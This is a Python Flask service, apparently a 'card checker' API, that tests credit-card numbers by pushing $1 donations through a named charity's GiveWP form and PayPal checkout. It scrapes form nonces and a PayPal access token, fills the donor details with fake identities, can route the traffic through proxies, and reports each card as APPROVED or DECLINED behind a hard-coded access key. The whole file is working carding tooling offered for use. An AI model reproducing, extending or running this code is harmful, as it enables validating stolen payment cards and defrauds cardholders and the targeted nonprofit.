from flask import Flask, request, jsonify
import requests
import re
import html
from urllib.parse import urlparse, parse_qs
from faker import Faker

app = Flask(__name__)
fake = Faker()

def check_soule_card(cc, mm, yy, cvv, proxy_url=None):
    """Main function to check card on soule-foundation.org"""
    
    # Setup session with proxy
    session = requests.Session()
    if proxy_url:
        try:
            proxy_parts = proxy_url.split(':')
            if len(proxy_parts) == 4:
                host, port, user, passw = proxy_parts
                proxy_str = f'http://{user}:{passw}@{host}:{port}'
            else:
                host, port = proxy_parts
                proxy_str = f'http://{host}:{port}'
            
            session.proxies = {'http': proxy_str, 'https': proxy_str}
        except:
            pass

    try:
        # Step 1: Get form data
        headers = {
            'authority': 'soule-foundation.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        params = {
            'givewp-route': 'donation-form-view',
            'form-id': '264641',
            'locale': 'en_US',
        }

        response = session.get('https://soule-foundation.org/', params=params, headers=headers)
        html_text = response.text

        # Extract form IDs
        id_match = re.search(r'"donationFormId":\s*(\d+)', html_text)
        nonce_match = re.search(r'"donationFormNonce":"(.*?)"', html_text)
        
        if not id_match or not nonce_match:
            return "DECLINED", "Form data not found"
        
        form_id = id_match.group(1)
        form_nonce = nonce_match.group(1)

        # Extract signature
        m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
        if not m:
            return "DECLINED", "Donate URL not found"
        
        donate_url = html.unescape(m.group(1))
        parsed = urlparse(donate_url)
        q = parse_qs(parsed.query)
        sig = q.get("givewp-route-signature", [""])[0]
        exp = q.get("givewp-route-signature-expiration", [""])[0]

        # Step 2: Get PayPal token
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        params = {
            'style.label': 'paypal',
            'style.layout': 'vertical',
            'style.color': 'gold',
            'clientID': 'BAAiO5DcFkSOsyZpJ0-yk9yxs0Z-uLSP0JUrIL0BvXctlH2i-Um4VYxdxYD6hNjXwg7CeKksWHICw74fkQ',
            'currency': 'USD',
            'intent': 'capture',
            'vault': 'false',
        }

        response = session.get('https://www.paypal.com/smart/buttons', params=params, headers=headers)
        html_text = response.text

        match = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', html_text)
        if not match:
            return "DECLINED", "PayPal token not found"
        
        token = match.group(1)

        # Step 3: Create order
        headers = {
            'authority': 'soule-foundation.org',
            'accept': '*/*',
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'origin': 'https://soule-foundation.org',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        params = {'action': 'give_paypal_commerce_create_order'}

        data = {
            'give-form-id': form_id,
            'give-form-hash': form_nonce,
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': fake.first_name(),
            'give_last': fake.last_name(),
            'give_email': fake.email(),
            'card_address': fake.street_address(),
            'card_city': fake.city(),
            'card_state': fake.state_abbr(),
            'card_zip': fake.zipcode(),
            'billing_country': 'US',
            'give-cs-form-currency': 'USD',
        }

        response = session.post(
            'https://soule-foundation.org/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=data,
        )

        if 'data' not in response.json() or 'id' not in response.json()['data']:
            return "DECLINED", "Order creation failed"
        
        order_id = response.json()["data"]["id"]

        # Step 4: Confirm payment with card
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'application/json',
            'authorization': f'Bearer {token}',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        # Format expiry
        if len(yy) == 2:
            yy = '20' + yy
        expiry = f"{yy}-{mm}"

        json_data = {
            'payment_source': {
                'card': {
                    'number': cc,
                    'security_code': cvv,
                    'expiry': expiry,
                },
            },
        }

        response = session.post(
            f'https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
            headers=headers,
            json=json_data,
        )

        # Step 5: Final donation
        headers = {
            'authority': 'soule-foundation.org',
            'accept': 'application/json',
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'origin': 'https://soule-foundation.org',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        params = {
            'givewp-route': 'donate',
            'givewp-route-signature': sig,
            'givewp-route-signature-id': 'givewp-donate',
            'givewp-route-signature-expiration': exp,
        }

        data = {
            'amount': '1',
            'currency': 'USD',
            'donationType': 'single',
            'formId': '264641',
            'gatewayId': 'paypal-commerce',
            'firstName': fake.first_name(),
            'lastName': fake.last_name(),
            'email': fake.email(),
            'country': 'US',
            'address1': fake.street_address(),
            'city': fake.city(),
            'state': fake.state_abbr(),
            'zip': fake.zipcode(),
            'gatewayData[payPalOrderId]': order_id,
        }

        response = session.post(
            'https://soule-foundation.org/',
            params=params,
            headers=headers,
            data=data
        )

        # Check final response
        if response.status_code == 200:
            response_data = response.json()
            if 'status' in response_data and response_data['status'] == 'success':
                return "APPROVED", "Charged $1 - Thank You"
            else:
                return "DECLINED", "Payment failed"
        else:
            return "DECLINED", f"HTTP {response.status_code}"

    except Exception as e:
        return "DECLINED", f"Error: {str(e)}"

@app.route('/check', methods=['GET'])
def check_card_api():
    """API endpoint: /check?key=BlackXCard&cc=card|mm|yy|cvv&proxy=host:port:user:pass"""
    
    # Get parameters
    key = request.args.get('key', '')
    cc_param = request.args.get('cc', '')
    proxy = request.args.get('proxy', '')
    
    # Check API key
    if key != "BlackXCard":
        return "INVALID_KEY"
    
    # Parse card details
    if '|' not in cc_param:
        return "INVALID_FORMAT"
    
    parts = cc_param.split('|')
    if len(parts) != 4:
        return "INVALID_FORMAT"
    
    cc, mm, yy, cvv = parts
    
    # Validate card
    if not all([cc, mm, yy, cvv]):
        return "MISSING_DETAILS"
    
    # Check card
    status, message = check_soule_card(cc, mm, yy, cvv, proxy)
    return status

@app.route('/')
def home():
    return "Soule Foundation Checker API - Use /check?key=BlackXCard&cc=card|mm|yy|cvv&proxy=host:port"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)